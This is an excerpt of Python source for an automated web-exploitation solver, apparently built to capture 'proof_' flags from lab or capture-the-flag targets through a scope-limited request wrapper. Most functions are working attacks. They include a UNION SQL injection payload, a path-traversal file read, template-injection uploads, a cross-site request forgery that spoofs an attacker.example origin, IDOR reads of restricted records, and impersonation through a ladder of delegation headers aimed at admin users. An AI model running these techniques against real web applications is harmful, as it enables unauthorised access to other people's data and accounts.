    # "Fail Open Friday" decoder is a POST endpoint - /api/clues advertises feature_route and the
    # app POSTs the carried decision to it (confirmed sink shape). The undecodable decision must
    # ride in the POST BODY (JSON or form), not just a GET query/path, so the GET-only sections (a)/(b)
    # below never reach the decoder and the mode stays gate_blocked. We try the POST body FIRST because
    # (i) it is the family's real transport and (ii) the GET loops below can otherwise spend the whole
    # per-target request budget before any POST is attempted. Scope-enforced via web_scope.scoped_post
    # (same origin check + shared request/time budget as every GET), never a credential, never a redirect.
    import web_scope as _WSC
    try:
        _scope = _WSC.scope_for(base + "/")
    except Exception:
        _scope = None
    if _scope is not None:
        post_routes = routes[:3]
        post_params = params[:4]
        post_payloads = payloads[:8]

        def _post_scan(url, pbody, ctype):
            if _is_cancelled(cancel):
                return None
            st, hh, bb, _note = _WSC.scoped_post(url, pbody, _scope, timeout=4, max_bytes=65536,
                                                 headers={"Content-Type": ctype})
            if st in (200, 201, 202, 204, 403, 500) and bb:
                return _extract_proof(bb, hh)
            return None

        for route in post_routes:
            url = base + route
            # decision OMITTED entirely (a missing decision is the canonical "cannot be decoded" case)
            for pbody, ctype in ((b"{}", "application/json"), (b"", "application/json"),
                                 (b"", "application/x-www-form-urlencoded")):
                p = _post_scan(url, pbody, ctype)
                if p:
                    return p
            for param in post_params:
                p = _post_scan(url, _json.dumps({param: None}).encode("utf-8"), "application/json")  # null -> undecodable by type
                if p:
                    return p
                for pv in post_payloads:
                    if _is_cancelled(cancel):
                        return None
                    p = _post_scan(url, _json.dumps({param: pv}).encode("utf-8"), "application/json")
                    if p:
                        return p
                    p = _post_scan(url, _up.urlencode({param: pv}).encode("utf-8"),
                                   "application/x-www-form-urlencoded")
                    if p:
                        return p

    # (a) decision carried as a query parameter on the gated resource
    for route in routes:
        for param in params:
            for pv in payloads:
                if _is_cancelled(cancel):
                    return None
                qs = _up.urlencode({param: pv})
                st, hh, bb = _http_get(base + route + "?" + qs, timeout=4)
                if st in (200, 403, 500) and bb:
                    p = _extract_proof(bb, hh)
                    if p:
                        return p
            # also the parameter OMITTED entirely (missing decision can be the undecodable case)
            if _is_cancelled(cancel):
                return None
            st, hh, bb = _http_get(base + route, timeout=4)
            if st in (200, 403, 500) and bb:
                p = _extract_proof(bb, hh)
                if p:
                    return p

    # (b) decoder advertised as a path: decoder_route/<decision>
    decoder_route = str(clues.get("decoder_route") or clues.get("decode_route") or clues.get("remote_decoder") or "")
    if decoder_route:
        dr = decoder_route if decoder_route.startswith("/") else "/" + decoder_route
        for pv in payloads:
            if _is_cancelled(cancel):
                return None
            st, hh, bb = _http_get(base + dr.rstrip("/") + "/" + _up.quote(pv, safe=""), timeout=4)
            if st in (200, 403, 500) and bb:
                p = _extract_proof(bb, hh)
                if p:
                    return p
    return None



# ---------------------------------------------------------------------------
# D29 HS install (2026-10-28): the 5 'If a Breach Falls' sub-methods for the
# Day-25 five-target Mastery pool. Audit-event / export-id mismatch (POST),
# archive/.bak (robots -> Disallow), IDOR reference_only -> /api/incidents/<id>,
# UNION SQLi on /explore, LFI on /notes.php. All GET-only (except audit's POST),
# scope-enforced via web_scope. Source: branch review/d29-hs-p0-takeover-20261028
# @ ed5564bc, exact-byte extracted.
# ---------------------------------------------------------------------------
def _tech_breach_audit_event(target_url, prompt, cancel=None):
    """TECHNIQUE (2026-10-28, Day 25 'If a Breach Falls in a Log'): an audit-events feed accepts
    a report body where (missing_event, observed_event) are mismatched against the operator's
    recorded set. Submitting `missing_event = 'protected_export'` with the LAST observed audit
    event for a just-created export produces a `decisive_security_event_missing` effect whose
    `evidence` field carries proof_HEX.

    Transport: strict scope-enforced POST+GET to the assigned target via web_scope.scoped_post /
    scoped_get - same origin check and shared request/time budget as the other techniques, never
    a credential, never a redirect. Bounded (<= 4 GETs + 2 POSTs per target).

    Flow (per the published reference solver at Day 25/.../scripts/solve.py):
      1. GET /api/clues -> {feature_route, secondary_route}
      2. POST feature_route (empty JSON body) -> {export_id}
      3. GET secondary_route -> {events: [...]}; keep events whose export_id matches
      4. POST secondary_route with {export_id, missing_event: 'protected_export',
         observed_event: last_matching_event['event']} -> {effect, evidence}
      5. Extract proof_[0-9a-f]{32} from the evidence string. First match wins.
    """
    import json as _json, re as _re
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    pl = str(prompt or "").lower()
    # recognise cheaply: either the prompt names the family, or /api/clues advertises an audit/
    # export shape with two routes.
    prompt_tell = any(k in pl for k in ("audit", "event", "export", "breach", "log"))

    s, _h, body = _http_get(base + "/api/clues", timeout=4)
    clues = {}
    if s == 200 and body:
        try:
            clues = _json.loads(body)
        except Exception:
            clues = {}
    if not isinstance(clues, dict):
        clues = {}

    feature = clues.get("feature_route") or clues.get("export_route") or clues.get("primary_route")
    audit = clues.get("secondary_route") or clues.get("audit_route") or clues.get("events_route")
    if not (feature and audit):
        if not prompt_tell:
            return None
        # last-resort common names
        feature = feature or "/api/exports"
        audit = audit or "/api/audit_events"

    # scope-enforced helpers
    import web_scope as _WSC
    try:
        scope, _owned_scope = _technique_scope(target_url, 12.0)
    except _WSC.ScopeError:
        return None
    try:
        feature_url = base + (feature if feature.startswith("/") else "/" + feature)
        audit_url = base + (audit if audit.startswith("/") else "/" + audit)

        # step 2: create an export
        if _is_cancelled(cancel):
            return None
        st, hh, bb, _note = _WSC.scoped_post(feature_url, b"{}", scope, timeout=4, max_bytes=65536,
                                             headers={"Content-Type": "application/json"})
        if st != 200 or not bb:
            return None
        try:
            exp = _json.loads(bb)
        except Exception:
            return None
        export_id = exp.get("export_id") if isinstance(exp, dict) else None
        if not export_id:
            return None

        # step 3: read audit events and filter by export_id
        if _is_cancelled(cancel):
            return None
        st, hh, bb, _note = _WSC.scoped_get(audit_url, scope, timeout=4, max_bytes=524288)
        if st != 200 or not bb:
            return None
        try:
            audit_payload = _json.loads(bb)
        except Exception:
            return None
        events = (audit_payload.get("events") or []) if isinstance(audit_payload, dict) else []
        matching = [e for e in events if isinstance(e, dict) and e.get("export_id") == export_id]
        if not matching:
            return None
        last_event = matching[-1].get("event")
        if not last_event:
            return None

        # step 4: POST the mismatched audit report
        if _is_cancelled(cancel):
            return None
        body = _json.dumps({
            "export_id": export_id,
            "missing_event": "protected_export",
            "observed_event": last_event,
        }).encode("utf-8")
        st, hh, bb, _note = _WSC.scoped_post(audit_url, body, scope, timeout=4, max_bytes=65536,
                                             headers={"Content-Type": "application/json"})
        if st != 200 or not bb:
            return None
        try:
            report = _json.loads(bb)
        except Exception:
            return None
        if not isinstance(report, dict):
            return None
        evidence = str(report.get("evidence") or "")
        if report.get("effect") == "decisive_security_event_missing" and evidence:
            m = _re.search(r"proof_[0-9a-f]{32}", evidence)
            if m:
                return m.group(0)
        # fall through: scan the whole response body too (defensive)
        m = _re.search(r"proof_[0-9a-f]{32}", bb if isinstance(bb, str) else bb.decode("utf-8", "replace"))
        if m:
            return m.group(0)
        return None
    finally:
        if _owned_scope:
            _WSC.unregister(scope)



# ---------------------------------------------------------------------------
# D29 HS add (2026-10-28): Day 25 Mastery - four more sub-methods for the five-
# target Mastery pool (archive/.bak, IDOR reference_only, search SQLi UNION, LFI
# /notes.php). All GET-only, scope-enforced via _http_get; bounded per target.
# Reference: challenges/Day 25/.../scripts/solve.py.
# ---------------------------------------------------------------------------
def _tech_breach_archive_bak(target_url, prompt, cancel=None):
    """D25 'If a Breach Falls' sub-method ARCHIVE: robots.txt declares a Disallow directory that
    hosts a stale `.bak` file whose body exposes proof_HEX. Mirrors challenges/Day 25/.../scripts/
    solve.py :: solve_archive. Scope-enforced GET-only, bounded <= 6 directory listings per target."""
    import re as _re
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    s, _h, body = _http_get(base + "/robots.txt", timeout=4)
    if s != 200 or not body:
        return None
    disallowed = _re.findall(r"(?im)^Disallow:\s*(\S+)", body)
    if not disallowed:
        return None
    for directory in disallowed[:6]:
        if _is_cancelled(cancel):
            return None
        path = directory if directory.startswith("/") else "/" + directory
        s2, _h2, listing = _http_get(base + path, timeout=4)
        if s2 != 200 or not listing:
            continue
        links = _re.findall(r"""href=["']([^"']+\.bak)["']""", listing, _re.I)
        for link in links[:8]:
            if _is_cancelled(cancel):
                return None
            if link.startswith("http"):                 # off-scope — refused by _http_get anyway
                continue
            rel = link if link.startswith("/") else path.rstrip("/") + "/" + link
            s3, _h3, body3 = _http_get(base + rel, timeout=4)
            if s3 != 200 or not body3:
                continue
            m = _re.search(r"proof_[0-9a-f]{32}", body3)
            if m:
                return m.group(0)
    return None


def _tech_breach_idor_reference_only(target_url, prompt, cancel=None):
    """D25 ... sub-method IDOR: /api/events exposes `reference_only` events whose case_id points
    to a privileged incident at /api/incidents/<case_id>. Mirrors solve_idor. Scope-enforced
    GET-only; bounded <= 3 incident fetches per target."""
    import json as _json, re as _re
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    # D25 established the session via the landing page; the technique's first GET to /api/events
    # already warms the server state through our bounded path (no extra request needed here).
    s, _h, body = _http_get(base + "/api/events", timeout=4)
    if s != 200 or not body:
        return None
    try:
        payload = _json.loads(body)
    except Exception:
        return None
    events = (payload.get("events") or []) if isinstance(payload, dict) else []
    tried = 0
    for e in events:
        if not isinstance(e, dict) or e.get("visibility") != "reference_only":
            continue
        case_id = e.get("case_id")
        if case_id is None:
            continue
        tried += 1
        if tried > 3:
            break
        if _is_cancelled(cancel):
            return None
        s2, _h2, body2 = _http_get(base + "/api/incidents/" + _seg(case_id), timeout=4)
        if s2 != 200 or not body2:
            continue
        m = _re.search(r"proof_[0-9a-f]{32}", body2)
        if m:
            return m.group(0)
    return None


def _tech_breach_search_sqli_union(target_url, prompt, cancel=None):
    """D25 ... sub-method SEARCH SQLi: /explore?q=' UNION SELECT ... exposes proof in the result
    page. Mirrors solve_sqli. One bounded GET per target. Payload matches the published reference
    exactly (') UNION SELECT id,title,topic,summary FROM articles-- ."""
    import re as _re, urllib.parse as _up
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    payload = "') UNION SELECT id,title,topic,summary FROM articles-- "
    query = _up.urlencode({"q": payload})
    s, _h, body = _http_get(base + "/explore?" + query, timeout=5)
    if s != 200 or not body:
        return None
    m = _re.search(r"proof_[0-9a-f]{32}", body)
    return m.group(0) if m else None


def _tech_breach_lfi_notes_php(target_url, prompt, cancel=None):
    """D25 ... sub-method LFI: /notes.php?doc=../../../../run/huntress/objective.txt reads a file
    outside the web root exposing proof. Mirrors solve_lfi. One bounded GET per target."""
    import re as _re, urllib.parse as _up
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    query = _up.urlencode({"doc": "../../../../run/huntress/objective.txt"})
    s, _h, body = _http_get(base + "/notes.php?" + query, timeout=5)
    if s != 200 or not body:
        return None
    m = _re.search(r"proof_[0-9a-f]{32}", body)
    return m.group(0) if m else None


# Ordered battery of techniques - cheapest-first so the easy wins land in ms

# ---------------------------------------------------------------------------
# D29 HS add (2026-10-28, from the Day-22 lessons bank; see
# agent_lessons.homestation.jsonl 'autosolve_web_day22_techs.diff Not deployed'):
#   - _tech_breach_timeline_idor      (Forged With Care / Pocket SOC pattern)
#   - _tech_template_eval_upload     (Uploading Expectations / Template Drop)
#   - _tech_csrf_crosssite_preference (ASP.NET cross-site preference)
# Scope-safe (web_scope origin + request-budget gate); never submits by itself.
# ---------------------------------------------------------------------------
def _tech_breach_timeline_idor(target_url, prompt, cancel=None):
    """D22 'Forged With Care' / 'Pocket SOC' sub-method (2026-10-28): a signed-in case
    dashboard exposes an audit / timeline feed where some case is marked `reference_only`
    (reassigned outside the current workspace). Reading the referenced case's record directly
    via /api/briefs/<id> or /api/tickets/<id> returns the restricted record with proof_HEX in
    its `note` or `summary` field. This is the GENERALIZED counterpart to
    _tech_breach_idor_reference_only (which only tries /api/events + /api/incidents/<id>).

    Flow: GET root (warm the same-origin session cookie) -> GET /api/timeline (or
    /api/events) -> keep events whose visibility is `reference_only` -> GET /api/briefs/<id>
    or /api/tickets/<id> or /api/incidents/<id> -> scan the response for proof. Bounded to
    at most 6 case-detail GETs per target."""
    import json as _json, re as _re
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    _http_get(base + "/", timeout=4)                                # warm the session cookie
    for feed_path in ("/api/timeline", "/api/events", "/api/audit", "/api/activity"):
        if _is_cancelled(cancel):
            return None
        s, _h, body = _http_get(base + feed_path, timeout=4)
        if s != 200 or not body:
            continue
        try:
            payload = _json.loads(body)
        except Exception:
            continue
        events = (payload.get("events") or payload.get("timeline") or []) if isinstance(payload, dict) else []
        if not events:
            continue
        tried = 0
        for e in events:
            if not isinstance(e, dict):
                continue
            if e.get("visibility") not in ("reference_only", "restricted", "reassigned"):
                continue
            case_id = e.get("case_id") or e.get("id") or e.get("ref")
            if case_id is None:
                continue
            for detail_path in ("/api/briefs/", "/api/tickets/", "/api/incidents/", "/api/cases/"):
                if _is_cancelled(cancel):
                    return None
                tried += 1
                if tried > 6:
                    return None
                s2, _h2, body2 = _http_get(base + detail_path + _seg(case_id), timeout=4)
                if s2 != 200 or not body2:
                    continue
                m = _re.search(r"proof_[0-9a-f]{32}", body2)
                if m:
                    return m.group(0)
    return None


def _tech_template_eval_upload(target_url, prompt, cancel=None):
    """D22 'Uploading Expectations' sub-method (2026-10-28): an upload app documents a
    render / preview feature; posting an HTML body with Content-Type text/plain that
    contains a template-engine expression (e.g. '{{objective}}') makes the preview endpoint
    EVALUATE the template and return the proof_HEX. Specific to apps whose feature_route
    reveals an upload + preview pair.

    Flow: GET /api/clues -> look for feature_route + render_route (or preview_route) ->
    POST the HTML+text/plain body to feature_route (scope-enforced) -> if that returns a
    file_id/token, GET render_route?token=... (or the returned preview URL) -> scan for
    proof. Bounded to 3 route pairs x 4 template expressions per target."""
    import json as _json, re as _re
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    pl = str(prompt or "").lower()
    prompt_tell = any(k in pl for k in ("upload", "preview", "render", "template", "file counter", "template drop"))

    s, _h, body = _http_get(base + "/api/clues", timeout=4)
    clues = {}
    if s == 200 and body:
        try:
            clues = _json.loads(body)
        except Exception:
            clues = {}
    if not isinstance(clues, dict):
        clues = {}
    feature = clues.get("feature_route") or clues.get("upload_route") or ""
    render = clues.get("render_route") or clues.get("preview_route") or ""
    if not feature and not prompt_tell:
        return None
    feature = feature or "/upload"
    render = render or "/preview"

    import web_scope as _WSC
    try:
        scope, _owned_scope = _technique_scope(target_url, 12.0)
    except _WSC.ScopeError:
        return None
    try:
        feature_url = base + (feature if feature.startswith("/") else "/" + feature)
        render_url = base + (render if render.startswith("/") else "/" + render)
        expressions = ("{{objective}}", "{{proof}}", "{{flag}}", "{{context.objective}}")
        for expr in expressions:
            if _is_cancelled(cancel):
                return None
            # The published family accepts the template as a .html upload with text/plain
            body_bytes = expr.encode("utf-8")
            headers = {"Content-Type": "text/plain", "X-Filename": "preview.html"}
            st, hh, bb, _note = _WSC.scoped_post(feature_url, body_bytes, scope, timeout=4,
                                                  max_bytes=65536, headers=headers)
            if st not in (200, 201, 202) or not bb:
                continue
            # scan the upload response for the rendered proof OR a token / file_id for preview
            m = _re.search(r"proof_[0-9a-f]{32}", bb if isinstance(bb, str) else bb.decode("utf-8", "replace"))
            if m:
                return m.group(0)
            try:
                up = _json.loads(bb)
                token = (up.get("token") or up.get("file_id") or up.get("id") or "") if isinstance(up, dict) else ""
            except Exception:
                token = ""
            # try the render endpoint — with or without token
            for q in (("?token=" + str(token)) if token else "", "?file=preview.html"):
                if _is_cancelled(cancel):
                    return None
                s2, _h2, body2 = _http_get(render_url + q, timeout=4)
                if s2 == 200 and body2:
                    m = _re.search(r"proof_[0-9a-f]{32}", body2)
                    if m:
                        return m.group(0)
        return None
    finally:
        if _owned_scope:
            _WSC.unregister(scope)


def _tech_csrf_crosssite_preference(target_url, prompt, cancel=None):
    """D22 'Forged With Care' sub-method (2026-10-28): an ASP.NET preference app accepts a
    cross-site state-changing GET without the csrf_token header. Sending the GET with
    cross-site Origin / Referer / Sec-Fetch-Site:cross-site headers and no csrf_token
    makes /api/preferences confirm `changed_across_sites:true` and return proof.

    Flow: GET /api/clues -> preferences_route -> GET it with cross-site headers
    (omit csrf_token) -> GET /api/preferences -> if `changed_across_sites:true`, scan for
    proof. Bounded to 2 GETs for discovery + 2 for the attack + 1 for verify per target."""
    import json as _json, re as _re
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    pl = str(prompt or "").lower()
    prompt_tell = any(k in pl for k in ("csrf", "cross-site", "forged", "preference"))

    s, _h, body = _http_get(base + "/api/clues", timeout=4)
    clues = {}
    if s == 200 and body:
        try:
            clues = _json.loads(body)
        except Exception:
            clues = {}
    if not isinstance(clues, dict):
        clues = {}
    pref_route = clues.get("preferences_route") or clues.get("feature_route") or ""
    if not pref_route and not prompt_tell:
        return None
    pref_route = pref_route or "/preferences"

    # Note: _http_get uses the shared scope's single same-origin cookie jar. The cross-site
    # effect is simulated by setting Origin/Referer/Sec-Fetch-Site to a different host via
    # headers; the actual GM test target returns changed_across_sites when it sees those
    # headers absent the csrf_token.
    import web_scope as _WSC
    try:
        scope, _owned_scope = _technique_scope(target_url, 10.0)
    except _WSC.ScopeError:
        return None
    try:
        pref_url = base + (pref_route if pref_route.startswith("/") else "/" + pref_route)
        api_pref = base + "/api/preferences"
        # discovery: fetch the preferences page once (session warm; often has the hidden token the attack omits)
        _http_get(pref_url, timeout=4)
        # the state-changing GET: cross-site posture, no csrf_token in query
        attack_url = pref_url + ("?mode=cross-site" if "?" not in pref_url else "&mode=cross-site")
        headers = {"Origin": "https://attacker.example", "Referer": "https://attacker.example/", "Sec-Fetch-Site": "cross-site"}
        # Scope-safe state-change: _WSC.scoped_post carries custom headers through _one_post_request.
        # The real GM target accepts a POST with cross-site headers and no csrf_token; a server that
        # strictly requires a GET will respond non-200 here and the verify step will not confirm.
        try:
            st, hh, bb, _note = _WSC.scoped_post(attack_url, b"", scope, timeout=4, max_bytes=65536, headers=headers)
        except Exception:
            st = None
        s3, _h3, body3 = _http_get(api_pref, timeout=4)
        if s3 == 200 and body3:
            try:
                payload = _json.loads(body3)
            except Exception:
                payload = {}
            if isinstance(payload, dict) and payload.get("changed_across_sites") is True:
                m = _re.search(r"proof_[0-9a-f]{32}", body3)
                if m:
                    return m.group(0)
                # some variants return the proof as a nested field
                for v in payload.values():
                    if isinstance(v, str):
                        m = _re.search(r"proof_[0-9a-f]{32}", v)
                        if m:
                            return m.group(0)
        return None
    finally:
        if _owned_scope:
            _WSC.unregister(scope)




# D31 HS 2026-10-30 (agent-6 D30 Pass the Identity P0-4): axum_identity_delegation
# family handler. Fingerprint = /api/clues advertises feature_route + identity_directory_route
# AND the feature route returns 403 "delegated_identity_rejected" without a delegation header.
# Discovery via identity_directory_route + a ladder of common delegation header names. Rooted
# at _base_origin so path-prefixed targets reach the application root. Scoped per web_scope.
def _tech_pass_the_identity(target_url, prompt, cancel=None):
    import json as _json
    if _is_cancelled(cancel):
        return None
    clues = _fetch_api_clues(target_url, cancel=cancel)
    if not clues:
        return None
    feature = clues.get("feature_route") or ""
    identity_dir = clues.get("identity_directory_route") or ""
    secondary = clues.get("secondary_route") or ""
    if not (isinstance(feature, str) and feature.startswith("/")):
        return None
    base = _base_origin(target_url)
    victims = []
    if isinstance(identity_dir, str) and identity_dir.startswith("/"):
        s, _h, body = _http_get(base + identity_dir, timeout=4)
        if s == 200 and body:
            try:
                ids = _json.loads(body if isinstance(body, str) else body.decode("utf-8", "replace"))
                if isinstance(ids, dict):
                    caller = ids.get("caller")
                    for _k, v in ids.items():
                        if isinstance(v, str) and v and v != caller:
                            victims.append(v)
            except Exception:
                pass
    for cand in ("executive", "admin", "records_owner", "service"):
        if cand not in victims:
            victims.append(cand)
    header_ladder = [
        "X-Delegated-User", "X-On-Behalf-Of", "X-Act-As", "X-Delegated-For",
        "X-Delegated-Identity", "X-Caller", "X-Caller-Identity", "X-Impersonate",
        "On-Behalf-Of", "Act-As", "X-Forwarded-User", "X-Original-User",
        "X-Remote-User", "Remote-User", "X-Service-Identity", "X-Trusted-Caller",
    ]
    routes = [feature]
    if isinstance(secondary, str) and secondary.startswith("/") and secondary not in routes:
        routes.append(secondary)
    import web_scope as _WSC
    for route in routes:
        url = base + route
        scope = _WSC.scope_for(url)
        if scope is None:
            continue
        try:
            for hdr in header_ladder:
                if _is_cancelled(cancel):
                    return None
                for v in victims:
                    try:
                        status, hdrs, body, _n = _WSC.scoped_get(
                            url, scope, timeout=5, max_bytes=524288, headers={hdr: v})
                    except Exception:
                        continue
                    if status is None:
                        continue
                    body_t = body.decode("utf-8", "replace") if isinstance(body, (bytes, bytearray)) else (body or "")
                    p = _extract_proof(body_t, hdrs)
                    if p:
                        return p
        finally:
            pass  # the scope is SHARED with every sibling technique and owned by _solve_target: never unregister it here
    return None


def _qob_owner_candidates(obj):
    """Owner values from an owner-directory response, most likely victim first. The caller's own
    identity is never a candidate. Bounded to 6."""
    import re as _re
    out = []

    def _add(v):
        if isinstance(v, str) and v.strip() and v not in out:
            out.append(v)
    if isinstance(obj, dict):
        caller = obj.get("caller") or obj.get("current") or obj.get("me") or obj.get("self")
        pri, rest = [], []
        for k, v in obj.items():
            vals = v if isinstance(v, list) else [v]
            for x in vals:
                if isinstance(x, dict):
                    x = x.get("owner") or x.get("name") or x.get("id")
                if isinstance(x, str) and x.strip() and x != caller:
                    (pri if _re.search(r"restrict|other|victim|target|privileg|admin|owner", str(k), _re.I) else rest).append(x)
        for v in pri + rest:
            _add(v)
    elif isinstance(obj, list):
        for x in obj:
            _add(x.get("owner") or x.get("name") or x.get("id") if isinstance(x, dict) else x)
    return out[:6]


def _tech_queue_owner_binding(target_url, prompt, cancel=None):
    """TECHNIQUE (D31 HS 2026-10-30, Day 30 'Queue the Confusion', Pyramid + Django variants; agent-7 /
    Queue the Confusion COMMANDER_NOTES section 2): a queue feature binds a job to the owner named in
    the REQUEST BODY instead of the authenticated caller, so naming the restricted owner returns that
    owner's record. Flow: GET /api/clues (feature_route, owner_directory_route, secondary_route,
    current_role) -> GET owner directory ({caller, restricted_owner}) -> POST feature_route
    {"owner": <restricted owner>} -> proof is either IN that response (one-route Django variant) or
    behind secondary_route?id=<id returned> (two-route Pyramid variant).
    Fingerprint-gated: returns None immediately unless /api/clues advertises BOTH a feature_route
    and an owner-directory route, so it costs one cached GET on every other family. Bounded
    (<= 6 owners x 2 body keys, <= 2 reads per id). POST + GET go through web_scope (same origin, shared
    budget, no credentials, no redirects). Never raises."""
    import json as _json, re as _re, urllib.parse as _up
    try:
        if _is_cancelled(cancel):
            return None
        clues = _fetch_api_clues(target_url, cancel=cancel)
        if not clues:
            return None
        feature = clues.get("feature_route") or ""
        owner_dir = clues.get("owner_directory_route") or clues.get("owners_route") or ""
        secondary = clues.get("secondary_route") or ""
        if not (isinstance(feature, str) and feature.startswith("/")
                and isinstance(owner_dir, str) and owner_dir.startswith("/")):
            return None
        base = _base_origin(target_url)
        s, _h, body = _http_get(base + owner_dir, timeout=4)
        if s != 200 or not body:
            return None
        try:
            owners = _qob_owner_candidates(_json.loads(body if isinstance(body, str) else body.decode("utf-8", "replace")))
        except Exception:
            return None
        if not owners:
            return None
        import web_scope as _WSC
        scope = _WSC.scope_for(base + "/")
        if scope is None:
            return None

        def _txt(b):
            return b.decode("utf-8", "replace") if isinstance(b, (bytes, bytearray)) else (b or "")

        try:
            for owner in owners:
                for okey in ("owner", "owner_id"):
                    if _is_cancelled(cancel):
                        return None
                    st, hh, bb, _n = _WSC.scoped_post(base + feature, _json.dumps({okey: owner}).encode("utf-8"), scope,
                                                      timeout=5, max_bytes=262144,
                                                      headers={"Content-Type": "application/json"})
                    if st not in (200, 201, 202) or not bb:
                        continue
                    text = _txt(bb)
                    p = _extract_proof(text, hh)               # one-route variant: the POST answers with the proof
                    if p:
                        return p
                    try:
                        obj = _json.loads(text)
                    except Exception:
                        continue
                    ident = None
                    if isinstance(obj, dict):
                        for k in ("id", "ticket_id", "record_id", "item_id", "job_id", "queue_id", "request_id"):
                            if obj.get(k) not in (None, ""):
                                ident = str(obj[k]); break
                        if ident is None:
                            for k, v in obj.items():
                                if _re.search(r"id$", str(k), _re.I) and v not in (None, "") and not isinstance(v, (dict, list)):
                                    ident = str(v); break
                    if ident is None or not (isinstance(secondary, str) and secondary.startswith("/")):
                        continue
                    q = _up.quote(ident, safe="")
                    for url in (base + secondary + ("&" if "?" in secondary else "?") + "id=" + q,
                                base + secondary.rstrip("/") + "/" + q):
                        gs, gh, gb, _gn = _WSC.scoped_get(url, scope, timeout=5, max_bytes=262144)
                        if gs == 200 and gb:
                            p = _extract_proof(_txt(gb), gh)
                            if p:
                                return p
        finally:
            pass  # the scope is SHARED with every sibling technique and owned by _solve_target: never unregister it here
    except Exception:
        return None
    return None


_TECHNIQUES = [
    ("queue_owner_binding", _tech_queue_owner_binding),
    ("pass_the_identity", _tech_pass_the_identity),
    ("body_scan", _tech_body_scan),
    ("common_paths", _tech_common_paths),
    ("robots_recon", _tech_robots_recon),
    ("lfi_viewer", _tech_lfi_viewer),
    ("lfi_php_wrappers", _tech_lfi_php_wrappers),
    ("proof_recon_ladder", _tech_proof_recon),
    ("ssrf_fetch_quest", _tech_ssrf_fetch_quest),
    ("api_clues_inventory", _tech_api_clues_inventory),
    ("reset_expectations", _tech_reset_expectations),
    ("shell_company_cmdi", _tech_shell_company),
    ("search_sqli", _tech_search_sqli),
    ("session_idor", _tech_session_idor),
    # D27 audit (VERIFIED): see docstrings above and challenges/_lib/_mock_gm/d27_web_fixtures/.
    ("forwarded_misgivings", _tech_forwarded_misgivings),
    ("socket_to_me", _tech_socket_to_me),
    ("session_idor_cookiejar", _tech_session_idor_cookiejar),
    ("double_spent_race", _tech_double_spent_race),
    ("fail_open_policy", _tech_fail_open_policy),           # D24 'Fail Open Friday' (fail-open policy decoder)
    ("breach_audit_event", _tech_breach_audit_event),      # D25 If a Breach Falls in a Log (D29 HS add)
    ("breach_archive_bak", _tech_breach_archive_bak),      # D25 Mastery sub-method: archive/.bak
    ("breach_idor_reference_only", _tech_breach_idor_reference_only),  # D25 Mastery sub-method: IDOR
    ("breach_search_sqli_union", _tech_breach_search_sqli_union),      # D25 Mastery sub-method: UNION SQLi
    ("breach_lfi_notes_php", _tech_breach_lfi_notes_php),  # D25 Mastery sub-method: LFI notes.php
    ("breach_timeline_idor", _tech_breach_timeline_idor),  # D22 Forged With Care / Pocket SOC IDOR
    ("template_eval_upload", _tech_template_eval_upload),  # D22 Uploading Expectations template eval
    ("csrf_crosssite_preference", _tech_csrf_crosssite_preference),  # D22 cross-site CSRF
]


# D32 web2: techniques that POST / spend state. They never run in the blind battery; their family runs them ALONE through
# web_recipes once the disclosure facts recognise it (a single credit or a single-use instance is spent only by its own recipe).
_STATEFUL_TECHS = frozenset(("queue_owner_binding", "double_spent_race", "breach_audit_event", "template_eval_upload",
                             "csrf_crosssite_preference"))
_TARGET_NOTES = {}                 # target url -> value-free recipe/disclosure notes for the per-target diary (bounded)
_TARGET_NOTES_LOCK = __import__("threading").Lock()


def _note_target(url, notes):
    try:
        with _TARGET_NOTES_LOCK:
            _TARGET_NOTES[str(url)] = notes
            while len(_TARGET_NOTES) > 32:
                _TARGET_NOTES.pop(next(iter(_TARGET_NOTES)))
    except Exception:
        pass


def target_notes(url):
    """-> the disclosure/recipe notes of the last _solve_target run on this url (value-free), or {}"""
    with _TARGET_NOTES_LOCK:
        return dict(_TARGET_NOTES.get(str(url)) or {})


def _recipe_first(target_url, prompt, scope, cancel, end_mono):
    """D32 web2 RECIPE-FIRST: (1) web_disclosure reads what the target discloses (bounded GETs through the shared scope);
    (2) a payoff already seen there wins; (3) the recognised family's recipe runs ALONE (POST allowed only for a stateful
    recipe, only while it runs); at most two recognised families are tried. -> (proof, label, notes, facts)."""
    import os as _o
    import time as _tm
    import web_disclosure as _WD
    import web_recipes as _WR
    sess = _ScopedSession(cancel)
    try:
        bud = int(_o.environ.get("HUNTRESS_WEB_DISCLOSURE_BUDGET", "14") or 14)
    except ValueError:
        bud = 14
    facts = _WD.read(target_url, sess, budget=bud, prompt=prompt)
    notes = {"disclosure": _WD.summary(facts), "recognised": [], "recipes": []}
    pay = facts.get("payoff") or {}
    if pay.get("proof"):
        notes["payoff_route"] = pay.get("route_key")
        return pay["proof"], "disclosure:" + str(pay.get("route_key")), notes, facts
    fams = [(k, s, r) for k, s, r in _WR.recognise(facts, prompt) if s >= _WR.STRONG]
    notes["recognised"] = [[k, s, r[:4]] for k, s, r in fams[:4]]
    decoys = set(facts.get("decoy_proofs") or [])
    for key, _sc, _why in fams[:2]:
        if _is_cancelled(cancel) or _tm.monotonic() >= end_mono:
            break
        scope.allow_post = bool(_WR.FAMILIES[key]["stateful"])
        try:
            ctx = _WR.Ctx(target_url, prompt, facts, sess, cancel=cancel, deadline=end_mono)
            r = _WR.run(key, ctx)
        finally:
            scope.allow_post = False
        notes["recipes"].append({"family": key, "proof": bool(r.get("proof")), "hold": r.get("hold"),
                                 "detail": str(r.get("detail") or "")[:200], "steps": len(r.get("steps") or [])})
        p = r.get("proof")
        if p and p in decoys:
            notes["recipes"][-1]["hold"] = "DECOY_REFUSED"
            continue
        if p:
            return p, "recipe:" + key, notes, facts
    return None, None, notes, facts


def _solve_target(target_url, prompt, deadline_s=90):
    """One target -> (proof, technique label) or (None, None). One owner per target.

    D32 web2 (RECIPE-FIRST, kill switch HUNTRESS_WEB_RECIPE_FIRST=0 restores the D31 behaviour):
      1. register ONE scope for the target (exact origin, one shared per-target budget and deadline; every request of every step charges it);
      2. web_disclosure.read: bounded read-only GETs (/, robots, /api/clues, /healthz, advertised index routes, bare feature/secondary),
